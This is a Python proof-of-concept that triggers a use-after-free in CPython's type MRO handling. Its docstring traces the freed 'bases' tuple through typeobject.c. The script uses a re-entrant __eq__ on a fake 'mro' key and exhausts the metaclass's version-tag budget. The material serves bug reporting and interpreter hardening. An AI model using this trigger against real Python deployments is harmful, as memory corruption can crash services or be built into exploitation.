"""UAF: type_mro_modified() uses its `bases` parameter after has_custom_mro()
has run arbitrary Python.

Objects/typeobject.c (3.16.0a0 @ 4f3be1b5777):

  3678  set_tp_mro(type, new_mro, initial);   /* tp_mro now owns MRO_B      */
  3680  type_mro_modified(type, new_mro);     /* MRO_B passed in as `bases` */
          1296  if (!Py_IS_TYPE(type, &PyType_Type) && has_custom_mro(type))
                  -> _PyType_LookupStackRefAndVersion(Py_TYPE(tp), "mro", ..)
                     -> find_name_in_mro -> dict lookup in the METAclass dict
                        -> a non-string key whose __hash__ == hash("mro")
                           dispatches a user __eq__
                           -> re-entrant  T.__bases__ = (...)
                              -> mro_internal() replaces tp_mro and hands MRO_B
                                 to mro_hierarchy_for_complete_type(), whose
                                 rollback list is released at :1952, dropping
                                 the last reference to MRO_B.
          1299  n = PyTuple_GET_SIZE(bases);          <-- use after free
          1301  PyObject *b = PyTuple_GET_ITEM(bases, i);

mro_internal's own re-entrancy defence (the pointer-identity test at :3667)
sits BEFORE set_tp_mro; everything from :3678 on is unprotected.

Two things are needed to steer the __eq__ to the right lookup:

  * Meta's version-tag budget (MAX_VERSIONS_PER_CLASS = 1000, :1389) is burned
    so should_assign_version_tag() refuses, tp_version_tag stays 0, and every
    lookup really walks find_name_in_mro() instead of hitting the method cache.
  * The FIRST 'mro' lookup of the outer assignment is mro_invoke's
    call_method_noarg(type, "mro") at :3603, which IS protected (the :3667
    identity test catches it).  The re-entrant assignment therefore has to be
    delayed to the SECOND lookup, which is has_custom_mro's.

MROs are longer than PyTuple_MAXSAVESIZE (20) so the freed tuple does not come
straight back off the tuple freelist.

`scan_refcounts` cannot see this: `bases` is a *parameter*, not a
`lookup_tp_*()` load, so borrowed_field_deref_across_call
(borrowed_field_accessors = 4) never fires.
"""
DEPTH = 30

hits = []
armed = [False]
fired = []


def chain(prefix, n):
    cur = type(prefix + '0', (), {})
    for i in range(1, n):
        cur = type('%s%d' % (prefix, i), (cur,), {})
    return cur


X = chain('X', DEPTH)
Y = chain('Y', DEPTH)
Z = chain('Z', DEPTH)


class Evil:
    def __hash__(self):
        return hash('mro')

    def __eq__(self, other):
        if armed[0]:
            hits.append(1)
            # hit 0 == mro_invoke's lookup (guarded by the :3667 identity test)
            # hit 1 == has_custom_mro's lookup, from type_mro_modified:1296
            if len(hits) == 2:
                armed[0] = False
                fired.append(1)
                T.__bases__ = (Y,)
                print("  re-entrant __bases__ done inside has_custom_mro",
                      flush=True)
        return False


Meta = type('Meta', (type,), {Evil(): 1})
T = Meta('T', (X,), {})

# Exhaust Meta's version-tag budget so its 'mro' lookups are never cached.
for i in range(1200):
    setattr(Meta, 'v%d' % i, i)
    getattr(T, 'v%d' % i, None)

armed[0] = True
print("outer  T.__bases__ = (Z,) ...", flush=True)
T.__bases__ = (Z,)
print("done; re-entrancy fired:", bool(fired), flush=True)
